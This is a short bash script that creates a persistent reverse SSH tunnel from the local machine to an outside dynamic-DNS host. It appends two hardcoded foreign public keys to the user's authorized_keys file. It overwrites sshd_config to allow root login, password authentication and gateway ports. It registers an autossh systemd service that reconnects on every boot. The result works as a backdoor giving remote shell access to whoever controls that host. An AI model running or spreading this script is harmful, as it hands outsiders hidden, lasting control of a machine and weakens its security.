g!/bin/bash

# Packages needed for running this script successfully
# openssh-server, autossh

user="nobody1"

# DNS resolution can be used for this
host='edcoretecmm.sytes.net'

# Generate the private key
key_path="$HOME/.ssh/$(whoami)_ed25519"
ssh-keygen -t ed25519 -f "$key_path" -N ""

# Append public key into remote B server
ssh-copy-id -i "$key_path.pub" "$user@$host"

# Copy to remote public key to 127.0.0.1
nobody1_public="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfWGblM3hG4bwrALVaC0mWhnzdPeolZjUAvd0l6Eolk nobody1"
nobody2_public="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeQigM/aHDiVVl06SaUioJ9yll+4v+OsADC8WYdSLWz nobody2"

mkdir -p ~/.ssh
if [ "$user" = "nobody1" ]; then
	echo "$nobody1_public" >> ~/.ssh/authorized_keys
elif [ "$user" = "nobody2" ]; then
	echo "$nobody2_public" >> ~/.ssh/authorized_keys
fi

# Backup current sshd_config
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

# Configure sshd
requiredSettings="""
Port 22
ListenAddress 0.0.0.0
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
PermitRootLogin yes
PasswordAuthentication yes
AllowAgentForwarding yes
AllowTcpForwarding yes
GatewayPorts yes
PermitTTY yes
TCPKeepAlive yes
PermitTunnel yes
Subsystem sftp /usr/lib/openssh/sftp-server
"""

# Overwrite sshd_config with the required settings
echo "$requiredSettings" | sudo tee /etc/ssh/sshd_config > /dev/null


# Request a port number from the server (this could be handled by the server's API)
#received_port=$(curl -s "http://$host/info")
received_port=2020

# Set up the reverse tunnel using the received port
ssh -i "$key_path" -N -R "$received_port:127.0.0.1:22" "$user@$host" &

# Create a systemd service to ensure the reverse tunnel runs on boot
cat << EOF | sudo tee /etc/systemd/system/reverse-tunnel.service
[Unit]
Description=Reverse SSH Tunnel Service
After=network.target

[Service]
User=$USER
ExecStart=/usr/bin/autossh -i $key_path -N -R $received_port:127.0.0.1:22 "$user@$host"
Restart=always
RestartSec=3
Environment=KEY_PATH=$key_path

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd to apply the changes
sudo systemctl daemon-reload

# Enable the service so that it starts on boot
sudo systemctl enable reverse-tunnel.service

# Start the service immediately
sudo systemctl start reverse-tunnel.service

echo "Reverse tunnel setup complete. The service is now running and will reconnect after reboot."
